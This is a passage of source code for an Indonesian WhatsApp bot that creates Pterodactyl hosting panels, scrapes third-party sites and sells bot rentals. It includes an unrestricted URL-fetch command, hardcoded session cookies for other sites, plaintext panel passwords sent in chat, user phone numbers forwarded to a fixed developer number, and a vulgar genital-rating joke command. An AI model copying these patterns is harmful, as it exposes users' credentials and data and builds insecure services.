let password = global.temppw
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply(`*DATA AKUN PANEL*\nData Akun Sudah Dikirim Ke Private Chat`)
} else {
orang = m.chat
}
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${global.temppw.toString()}\"}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.tempuser = null
global.temppw = null
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cp10gbv3": case "cpunliv3": {
if (global.panel3 == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv3") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return reply(msg.owner)
let username = global.panel3[0].toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await m.reply(`*Data Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break

case "sewabot": case "sewa": {
const url1 = `https://files.catbox.moe/sgelxu.jpg`;
const url2 = `https://files.catbox.moe/sgelxu.jpg`;
const url3 = `https://files.catbox.moe/sgelxu.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: cay.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `hai kak @${m.sender.split("@")[0]}, kalo mau sewa klik di bawah ini yaa><\nkalo ga punya uang bisa kok free xixixi` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*1 minggu -*\n\n• \`price: 5k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 minggu","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Minggu","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Bulan -*\n\n• \`price: 10k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 bulan","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Bulan","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- Permanen -*\n\n• \`price: 20k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+Permanen","webview_presentation":null}`,
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await cay.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break

case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return reply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await cay.sendMessage(m.chat, { text: messageText }, { quoted: qtoko })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case 'get': {
if (!text) return m.reply(`awali *URL* dengan http:// atau https://`)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return m.reply(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return m.reply(textData);
} else if (text.includes('webp')) {
return cay.sendMessage(m.chat, { sticker: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/image/i.test(contentType)) { return cay.sendMessage(m.chat, {image: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/video/i.test(contentType)) { return cay.sendMessage(m.chat, {video: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return cay.sendMessage(m.chat, {audio: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return cay.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);			
} else if (/application\/pdf/i.test(contentType)) {
return cay.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);
} else {
return m.reply(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return m.reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break;
case 'morphic': {
  if (!text) return reply(`Example: ${prefix + command} hai`)
async function morphic(query) {
  const url = 'https://www.morphic.sh/';
  const formData = new FormData();
  
  formData.append('1', JSON.stringify({ id: '6399a7e212fa477d1a783edade27c8354a64e1ab', bound: null }));
  formData.append('2', JSON.stringify({ id: '9eed8f3e1c51044505fd5c0d73e8d2a92572691c', bound: null }));
  formData.append('3_input', query);
  formData.append('3_include_images', 'true');
  formData.append('0', JSON.stringify([{"action":"$F1","options":{"onSetAIState":"$F2"}},{"chatId":"9TI931x","messages":[]},"$K3",false,"$undefined","$undefined"]));

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
        Accept: 'text/x-component',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        Referer: 'https://www.morphic.sh/',
        'Next-Action': 'c54d85c7f9588581807befbe1a35958acc57885b',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        Origin: 'https://www.morphic.sh',
        Connection: 'close',
        Cookie: 'ph_phc_HK6KqP8mdSmxDjoZtHYi3MW8Kx5mHmlYpmgmZnGuaV5_posthog=%7B%22distinct_id%22%3A%220191839d-890a-7a97-b388-bc7191ac7047%22%2C%22%24sesid%22%3A%5B1724490025781%2C%220191839d-8909-72e8-b586-d66ff3bde34f%22%2C1724490025225%5D%7D',
        Priority: 'u=0',
        TE: 'trailers',
      },
      body: formData
    });

    const data = await response.text();

    const regex = /"diff":\[0,"([^"]+)"\]/g;
    let result;
    let finalText = "";

    while ((result = regex.exec(data)) !== null) {
      finalText += result[1];
    }

    return finalText;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
try {
  let hannpler = await morphic(text)
  cay.sendMessage(m.chat, {text: hannpler}, {quoted: m})
} catch (error) {
  reply("Error bang")
}
}
break

case 'txt2img': {
if (!text) return m.reply(`Example: ${prefix + command} cat`)
async function photoleap(prompt) {
    try {
        let result = []
        for (let i = 0; i < 3; i++) {
            let {
                data
            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url)
        }
        return result
    } catch (e) {
        return ({
            msg: 404
        })
    }
}

let tahu = await photoleap(text)
for (const x of tahu) {
cay.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break
case 'aio2': {
  if (!text) return reply(`Example: ${prefix + command} link tt lu`)
async function aio(url){
	return new Promise(async(resolve,reject) => {
		
 const { data: rest } = await axios.get("https://steptodown.com/")
    const $ = cheerio.load(rest) 
    const tokens = $("input[name='token']").val()
    const data = new URLSearchParams(
      Object.entries({
        url: url,
        token: tokens 
      })
    )    
    await axios.post("https://steptodown.com/wp-json/aio-dl/video-data/", data, {
      headers: {
        "cookie": "PHPSESSID=658754a80bacc095aced0be8e110f3b4; pll_language=en",
        "user-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {
      resolve(response.data)
    })
    .catch((e) => {
      reject(e)
    })
  })
}
let sonice = await aio(text)
let wpol = `[ *AIO DOWNLOADER* ]

${sonice.title}

Durasi: ${sonice.duration}
Source: ${sonice.source}
Size: ${sonice.medias[0].formattedSize} || ${sonice.medias[0].size}
Quality: ${sonice.medias[0].quality}
MimeType: ${sonice.medias[0].extension}
`
await cay.sendMessage(m.chat, { video: { url: sonice.medias[0].url }, caption: wpol }, { quoted: m })
}
break

case 'hd':
case 'remini': {
if (!/image/.test(mime)) return reply(`Kirim/Reply Gambar Yang Ingin Di Enchance !!`)
const meks = await quoted.download()
const proses = await remini(meks, "enhance");
cay.sendMessage(m.chat, {image: proses, mimetype: 'image/png'}, {quoted:m})
}
break
case 'tr': {
  if (!text) return reply(`reply yang mau ditranslate`)
async function translate(query = "", lang) {
	if (!query.trim()) return "";
	const url = new URL("https://translate.googleapis.com/translate_a/single");
	url.searchParams.append("client", "gtx");
	url.searchParams.append("sl", "auto");
	url.searchParams.append("dt", "t");
	url.searchParams.append("tl", lang);
	url.searchParams.append("q", query);

	try {
		const response = await fetch(url.href);
		const data = await response.json();
		if (data) {
			return [data[0].map((item) => item[0].trim()).join("\n"), data[2]];
		} else {
			return "";
		}
	} catch (err) {
		throw err;
	}
}

let banjir = await translate(m.quoted.text, "id")
m.reply(`${banjir[0]}, ${banjir[1]}`)
}
break

case 'anilist2': {
  if (!text) return m.reply("Example: .anilist naruto")
function anilist(query) {
  return new Promise((resolve, reject) => {
    axios.get('https://anilist.co/search/anime?search=' + query)
      .then(response => {
        const $ = cheerio.load(response.data);
        const anime = []
        const ling = []
        const image = []
        
        $('div.media-card a').each(function(a, b) {
          ling.push('https://anilist.co' + $(b).attr('href'))
        })
        
        $('div.media-card a img').each(function(a, b) {
          image.push($(b).attr('src'))
        })
        
        for (let i = 0; i < 10; i++) {
          const link = ling[i]
          const gambar = image[i]
          anime.push({
            link, gambar
          });
        }
        resolve(anime);
      })
      .catch(error => {
        reject(error);
      });
  });
}

async function anilistdetail(url) {
  try {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);

    const title = $('meta[property="og:title"]').attr('content');
    const description = $('meta[property="og:description"]').attr('content');

    const animeData = {
      title,
      description
    };

    return animeData
  } catch (error) {
    console.error(error);
  }
}
const date = await anilist(text)
const kanjut = await anilistdetail(date[0].link)
cay.sendMessage(m.chat, {image: {url: `${date[0].gambar}`}, caption: `Hasil Pencarian Anime:

Judul: ${kanjut.title}
Deskripsi: ${kanjut.description}
Link: ${date[0].link}
`}, {quoted: m})
}
break

case 'ttstalk':{
//wm senn
async function tiktokStalk(user) {
    let res = await axios.get(`https://urlebird.com/user/${user}/`)
//wm senn
         let $ = cheerio.load(res.data), obj = {}
             obj.pp_user = $('div[class="col-md-auto justify-content-center text-center"] > img').attr('src')
                 obj.name = $('h1.user').text().trim()
//wm senn
                 obj.username = $('div.content > h5').text().trim()
               obj.followers = $('div[class="col-7 col-md-auto text-truncate"]').text().trim().split(' ')[1]
//wm senn
           obj.following = $('div[class="col-auto d-none d-sm-block text-truncate"]').text().trim().split(' ')[1]
//wm senn
     obj.description = $('div.content > p').text().trim()
  return obj
//wm senn
} 
if (!text) return m.reply(`Masukan nama pengguna!!\nExample ${prefix + command} sen.h`)
//wm senn
let data = await tiktokStalk(text)
let cap = `\`\`\`「 Tiktok Stalk 」\`\`\`

Nama : ${data.name}
Username : ${data.username}
Pengikut : ${data.followers}
Mengikuti : ${data.following}
Bio : ${data.description}
`

cay.sendMessage(m.chat, { image: { url: data.pp_user }, caption: cap }, { quoted: m })

}
break

        case 'pler':
			case 'cekkontol':
			case 'cekpepek':
			case'cekpler':	
if (!q) return reply('Mana Nama?')
				
	const persenbucin1 = text
 const bucin1 =
 ["Hadehh🤦\n[ dah Item Bauk Lagi ishh🤮 ]","9%\n\nmasih kecil Ini mah ketutup ama bulu kontolnya Ae","nakk Masih Kecil","28%\n\nyoalahh hmm","34%\n\nmayan Lah","48%\n\ngatau","59%\n\nbiasa Kang Coli mah kontol nya ireng","apacoba\nkasian mana Masih Muda","itu tityd apa terong"," Ya ympun"]
				const tetot2 = bucin1[Math.floor(Math.random() * bucin1.length)]
 cay.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ selamat ${ucapan()}⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./media/thumb.jpg"),sourceUrl: global.gc,}
}, 
text : 'cekkontol: *'+persenbucin1+'*\n\nJawaban : '+ tetot2}, { quoted: qtext2 })
				break
case  'pin': {
  if (!text) return reply(`example: .pin cay toki`);
  await reply("Mohon tunggu kak");

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: cay.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10); 
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.namabot
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  let bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Done"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Search: ${text} | Nama: ${pushname}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await cay.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
        break
case 'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmin && !isOwner) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
        case 'bayar_vps_paket_1':
case 'bayar_vps_paket_2':
case 'bayar_vps_paket_3':
case 'bayar_vps_paket_4':
case 'bayar_vps_paket_5':
case 'bayar_vps_paket_6':
case 'bayar1gb':
case 'bayar2gb':
case 'bayar3gb':
case 'bayar4gb':
case 'bayar5gb':
case 'bayar6gb':
case 'bayar7gb':
case 'bayar8gb':
case 'bayar9gb':
case 'bayarunli':
case 'bayar_vps':
case 'bayar_panel':
case 'bayar_nokos':
reply('Kami sedang menyampaikan ke *`owner`* untuk pesanan anda 👍')
cay.sendMessage(global.owner2, { image: { url : 'https://telegra.ph/file/0437dfca1c8c72d4baa5d.jpg' }, caption: `Hay *${monospa('OWNER')}* 👋\n Ada pelanggan mau *${command}* nih!!\n\nDari: *${pushname}*\nNomor: _${m.sender.split('@')[0]}_` }, { quoted: m })
break

case 'req': 
case 'request':
case 'error':
case 'reportbug':
	if (!text) return m.reply(`Example : ${
        prefix + command
      } hi dev fitur play is not working`)
m.reply('Kami sedang menyampaikan ke *`creator`* 👍\n> trima kasih.')
cay.sendMessage(`6287875411618@s.whatsapp.net`, { image: { url : 'https://telegra.ph/file/0437dfca1c8c72d4baa5d.jpg' }, caption: `hay *${monospa('dev')}* 👋\n Ada yang mau report/req*${command}* nih!!\n\nDari: *${pushname}*\nNomor: _${m.sender.split('@')[0]}_` }, { quoted: m })
break

case'backup': case 'backupbot': {
let jir = m.mentionedJid[0] || m.sender || cay.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await m.reply('Bot Mencari File Sc 🔍');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
// Backup Mode By Ferdian 
// P Tutor Button Puh
let kontolmemeek = `*Sukses Melakukan Backup Dan Script Akan Dikirim Kepada Owner Lewat Privat Massage*`
m.reply (kontolmemeek) 
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await cay.sendMessage(owner2, {
document: await fs.readFileSync("./Backup.zip"),
